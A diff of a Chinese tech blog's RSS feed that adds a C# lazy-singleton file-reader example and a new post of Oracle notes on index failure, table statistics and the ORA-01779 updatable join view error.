 &lt;p&gt;解决方案5很优雅，但比2或4棘手，而且正如我上面所说，它提供的好处似乎很少有用。如果您使用的是.NET 4，则解决方案6是实现懒惰的一种更简单的方法，它还具有明显的惰性。我目前倾向于仅通过习惯就使用解决方案4，但是如果我与经验不足的开发人员一起工作，我很可能会选择解决方案6作为一种简单且普遍适用的模式开始。&lt;/p&gt;
 &lt;p&gt;（我不会使用解决方案1，因为它是有缺陷的，我不会使用解决方案3，因为它比不过5。）&lt;/p&gt;
 &lt;hr&gt;
+&lt;p&gt;用上述第六种方式实现读取文件的方法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C#&#34; data-lang=&#34;C#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;System&lt;/span&gt;;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;System.Collections.Generic&lt;/span&gt;;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;System.IO&lt;/span&gt;;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;System.Text&lt;/span&gt;;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;System.Web&lt;/span&gt;;
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;Demo&lt;/span&gt;
+{
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;MyFileReader&lt;/span&gt;
+    {
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; Lazy&amp;lt;MyFileReader&amp;gt; lazy = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Lazy&amp;lt;MyFileReader&amp;gt;(() =&amp;gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; MyFileReader());
+
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; MyFileReader Instance =&amp;gt; lazy.Value;
+
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; MyFileReader()
+        {
+        }
+
+        &lt;span style=&#34;color:#228b22&#34;&gt;/// &amp;lt;summary&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;///  读取json格式文件
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;/// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;/// &amp;lt;/summary&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;/// &amp;lt;param name=&amp;#34;filePath&amp;#34;&amp;gt;eg：\\Demo\\Config.txt&amp;lt;/param&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;/// &amp;lt;param name=&amp;#34;encodType&amp;#34;&amp;gt;默认为 Encoding.Default&amp;lt;/param&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#228b22&#34;&gt;/// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;string&lt;/span&gt; JsonReader(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;string&lt;/span&gt; filePath, Encoding encodType)
+        {
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (encodType == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
+            {
+                encodType = Encoding.Default;
+            }
+            &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;string&lt;/span&gt; jsonobj = &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;string&lt;/span&gt;.Empty;
+
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;using&lt;/span&gt; (StreamReader sr = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; StreamReader(System.Web.HttpRuntime.AppDomainAppPath + filePath, encodType))
+            {
+                &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;string&lt;/span&gt; line;
+                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; ((line = sr.ReadLine()) != &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
+                {
+                    jsonobj = jsonobj + line.ToString();
+                }
+            }
+
+            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; jsonobj;
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;调用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C#&#34; data-lang=&#34;C#&#34;&gt;&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;string&lt;/span&gt; json = fileReader.JsonReader(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;\\Demo\\Config.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
 &lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;a href=&#34;https://csharpindepth.com/articles/Singleton&#34;&gt;https://csharpindepth.com/articles/Singleton&lt;/a&gt;&lt;/li&gt;
@@ -1665,6 +1424,120 @@ console.log(&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cook
 &lt;h3 id=&#34;肉鸡的由来httpswwwtheguardiancomenvironment2020aug17from-farm-to-factory-the-unstoppable-rise-of-american-chicken&#34;&gt;&lt;a href=&#34;https://www.theguardian.com/environment/2020/aug/17/from-farm-to-factory-the-unstoppable-rise-of-american-chicken&#34;&gt;肉鸡的由来&lt;/a&gt;&lt;/h3&gt;
 &lt;p&gt;如题&lt;/p&gt;
 - https://www.openheart.icu/cs/interesting/ - ALL RIGHTS RESERVED KRIS NIE</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Oracle</title>
+        <link>https://www.openheart.icu/cs/oracle/</link>
+        <pubDate>Tue, 21 Jul 2020 20:28:00 +0000</pubDate>
+        
+        <guid>https://www.openheart.icu/cs/oracle/</guid>
+        <description>42th openheart https://www.openheart.icu/cs/oracle/ -&lt;h1 id=&#34;common-operation&#34;&gt;Common Operation&lt;/h1&gt;
+&lt;h2 id=&#34;删除操作前一定要先执行一遍查询&#34;&gt;删除操作前一定要先执行一遍查询&lt;/h2&gt;
+&lt;p&gt;如题， 带的一个新员工做补丁把项目历史数据干掉了 My bad.&lt;/p&gt;
+&lt;p&gt;2020-8-7&lt;/p&gt;
+&lt;h1 id=&#34;optimize&#34;&gt;Optimize&lt;/h1&gt;
+&lt;h2 id=&#34;索引失效&#34;&gt;索引失效&lt;/h2&gt;
+&lt;p&gt;SQL在&lt;code&gt;WHERE&lt;/code&gt;条件里面使用了&lt;code&gt;IN&lt;/code&gt;导致有一个关联表的索引失效，Oracle版本为11g&lt;/p&gt;
+&lt;p&gt;条件中有or，要想使用or，又想让索引生效，只能将or条件中的每个列都加上索引&lt;/p&gt;
+&lt;p&gt;like查询是以%开头&lt;/p&gt;
+&lt;p&gt;如果列类型是字符串，那一定要在条件中将数据使用引号引用起来,否则不使用索引&lt;/p&gt;
+&lt;h2 id=&#34;分库-分表-分区&#34;&gt;分库 分表 分区&lt;/h2&gt;
+&lt;h2 id=&#34;视图优化&#34;&gt;视图优化&lt;/h2&gt;
+&lt;h3 id=&#34;基表增加索引&#34;&gt;基表增加索引&lt;/h3&gt;
+&lt;p&gt;对基表中，视图查询SQL的&lt;code&gt;WHERE&lt;/code&gt;条件中用到的字段增加索引&lt;/p&gt;
+&lt;h3 id=&#34;重新进行表分析&#34;&gt;重新进行表分析&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;-- 视图查询慢
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;analyze&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;delete&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;statistics&lt;/span&gt;;
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;analyze&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt; compute &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;statistics&lt;/span&gt;;
+
+&lt;span style=&#34;color:#228b22&#34;&gt;-- 在当前用户下执行
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;analyze table &amp;#39;&lt;/span&gt;||&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt;||&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39; compute statistics;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;from&lt;/span&gt; user_tables &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;IN&lt;/span&gt; (&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;tablename&amp;#39;&lt;/span&gt;);   
+
+&lt;span style=&#34;color:#228b22&#34;&gt;-- 得到如下语句，将这些语句整体执行一遍
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;analyze&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table&lt;/span&gt; PRODUCT_REF_LIST_NESTEDTAB compute &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;statistics&lt;/span&gt;;
+    &lt;span style=&#34;color:#228b22&#34;&gt;-- ....
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#228b22&#34;&gt;-- 查看统计信息
+&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;table_name&lt;/span&gt;,num_rows &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;from&lt;/span&gt; user_tables;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析的结果被Oracle用于基于成本的优化生成更好的查询计划。&lt;/p&gt;
+&lt;p&gt;遇到当前表的查询或其他性能不好时，就可以对相应的表进行一次分析。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果你的表经常由几千万变成几百万，又变成几千万那么需要制定分析计划定期表分析，同时可以一并分析索引，计算索引中数据的分布情况，这样CBO会选择更加准确的执行计划。&lt;/li&gt;
+&lt;li&gt;如果表结构变化了也要做下，也就是经常对表做dml就需要分析，现在推荐使用dbms_stats包。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;error&#34;&gt;ERROR&lt;/h1&gt;
+&lt;h2 id=&#34;ora-01779-无法修改与非键值保存表对应的列&#34;&gt;ORA-01779: 无法修改与非键值保存表对应的列&lt;/h2&gt;
+&lt;p&gt;这里要搞清楚三个概念：视图、联接视图、可更新的联接视图&lt;/p&gt;
+&lt;h3 id=&#34;视图&#34;&gt;视图&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;视图&lt;/strong&gt;可以分为视图对象和内嵌视图两种。&lt;/p&gt;
+&lt;h4 id=&#34;视图对象view-object&#34;&gt;视图对象（View Object）&lt;/h4&gt;
+&lt;p&gt;数据库里的&lt;strong&gt;视图对象&lt;/strong&gt;跟一张表或索引等一样，是数据库对象中的一种，它其实是将基于表中原始数据的查询给虚拟了一层之后，提供给外部查询的一种对象。
+其本质是并不保存查询的实际结果，而只是将查询语句保存在数据库中，当用户查询某张视图的时候，就会找到并执行这个视图的语句。
+而&lt;strong&gt;联接视图&lt;/strong&gt;其实就是在一个视图中将两个表建立关联就是了。&lt;/p&gt;
+&lt;h4 id=&#34;内嵌视图inline-view&#34;&gt;内嵌视图（Inline View）&lt;/h4&gt;
+&lt;p&gt;在SQL语句中，很多地方都可以写嵌套的语句，比如说，FROM后面可以套括号嵌套其他的语句，WHERE、SELECT、UPDATE、INSERT、DELETE后面都是可以写的。只是写的位置不同，执行的方式还有处理时的一些限制不同，这些SQL中嵌套的SQL被称为&lt;strong&gt;子查询（Subquery）&lt;/strong&gt; 。子查询可以分为如下几类：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;内嵌视图：位置位于FROM语句中，也相当于一个预处理结果集的概念&lt;/li&gt;
+&lt;li&gt;标量子查询（Scalar Subquery）：只返还一个结果值的子查询。位于SELECT语句的子查询只能返还一个值，所以必然是标量子查询，WHERE语句里也会出现这样的子查询&lt;/li&gt;
+&lt;li&gt;关联子查询：将查询的结果传递给子查询作为参数的使用的形式&lt;/li&gt;
+&lt;li&gt;一般子查询：除了那些特殊形式的子查询以外的一般用法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;可更新联接视图updatable-join-view-&#34;&gt;可更新联接视图（Updatable Join View ）&lt;/h4&gt;
+&lt;p&gt;将一个联接视图（包括视图对象和内嵌视图）放到UPADTE语句中这样的语法形式。&lt;/p&gt;
+&lt;p&gt;同样的道理，如果只是用一个表来作为视图的基表，则可以对该视图直接进行&lt;code&gt;DELETE&lt;/code&gt;和&lt;code&gt;UPDATE&lt;/code&gt;，但无法直接执行&lt;code&gt;INSERT&lt;/code&gt;，因为该视图没有默认值的非空列(&lt;code&gt;brand_id&lt;/code&gt;)。该视图称为&lt;strong&gt;可更新视图&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;报错原理&#34;&gt;报错原理&lt;/h3&gt;
+&lt;p&gt;Oracle的键值保存表&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;SELECT&lt;/span&gt; *
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;FROM&lt;/span&gt; DBA_UPDATABLE_COLUMNS
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;SCOTT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;EMP_DEPT_V&amp;#39;&lt;/span&gt;;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;COLUMN_NAME&lt;/span&gt; | UPDATABLE | INSERTABLE | DELETABLE
+SCOTT   EMP_DEPT_V     EMPNO            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
+SCOTT   EMP_DEPT_V     ENAME            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
+SCOTT   EMP_DEPT_V     SAL              &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
+SCOTT   EMP_DEPT_V     DEPTNO           &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
+SCOTT   EMP_DEPT_V     DNAME            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;视图&lt;code&gt;EMP_DEPT_V&lt;/code&gt;里的字段都无法变更。&lt;/p&gt;
+&lt;p&gt;如果能保证DEPT_T表里的数据是唯一的就能够更新。也就是说在DEPT_T表上加&lt;code&gt;主键约束&lt;/code&gt;或&lt;code&gt;唯一约束&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE&lt;/span&gt; DEPT_T
+     &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;CONSTRAINT&lt;/span&gt; PK_DEPT_T &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;KEY&lt;/span&gt; (DEPTNO);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再看一下之前的视图：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;SELECT&lt;/span&gt; *
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;FROM&lt;/span&gt; DBA_UPDATABLE_COLUMNS
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;SCOTT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;EMP_DEPT_V&amp;#39;&lt;/span&gt;;
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;OWNER&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;TABLE_NAME&lt;/span&gt; | &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;COLUMN_NAME&lt;/span&gt; | UPDATABLE | INSERTABLE | DELETABLE
+SCOTT   EMP_DEPT_V     EMPNO            YES         YES         YES
+SCOTT   EMP_DEPT_V     ENAME            YES         YES         YES
+SCOTT   EMP_DEPT_V     SAL              YES         YES         YES
+SCOTT   EMP_DEPT_V     DEPTNO           YES         YES         YES
+SCOTT   EMP_DEPT_V     DNAME             &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;          &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;NO&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候就可以看到，视图中&lt;code&gt;EMP_DEPT_V&lt;/code&gt;表中原来的字段都是可以更新的了。&lt;/p&gt;
+&lt;p&gt;在对联接视图进行变更的时候，必须保证修改后的值是唯一的，并且这个事实要让数据库知道，而告知数据库的方法是建立主键约束或唯一约束。&lt;/p&gt;
+&lt;p&gt;并不是所有的表都可以随意建这些约束，有什么方法能够不添加约束也能变更？&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;添加&lt;code&gt;/*+ BYPASS_UJVC */&lt;/code&gt; 提示，让ORACLE跳过检查（11g R2之后无效，不建议使用）&lt;/li&gt;
+&lt;li&gt;改写&lt;code&gt;UPDATE&lt;/code&gt;语句，通过其他方式判断后处理&lt;/li&gt;
+&lt;li&gt;将&lt;code&gt;UPDATE&lt;/code&gt;改成&lt;code&gt;MERGE&lt;/code&gt;语句&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Oracle：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The concept of a &lt;strong&gt;key-preserved table&lt;/strong&gt; is fundamental to understanding the restrictions on &lt;strong&gt;modifying join views&lt;/strong&gt;. A table is key-preserved if every key of the table can also be a key of the result of the join. So, a key-preserved table has its keys preserved through a join.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;An &lt;strong&gt;updatable join view&lt;/strong&gt; (also referred to as a &lt;strong&gt;modifiable join view&lt;/strong&gt;) is a view that contains multiple tables in the top-level FROM clause of the SELECT statement, and is not restricted by the WITH READ ONLY clause.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/60a56760b19f&#34;&gt;https://www.jianshu.com/p/60a56760b19f&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.yiibai.com/oracle/oracle-updatable-view.html&#34;&gt;https://www.yiibai.com/oracle/oracle-updatable-view.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+- https://www.openheart.icu/cs/oracle/ - ALL RIGHTS RESERVED KRIS NIE</description>
         </item>
     
     
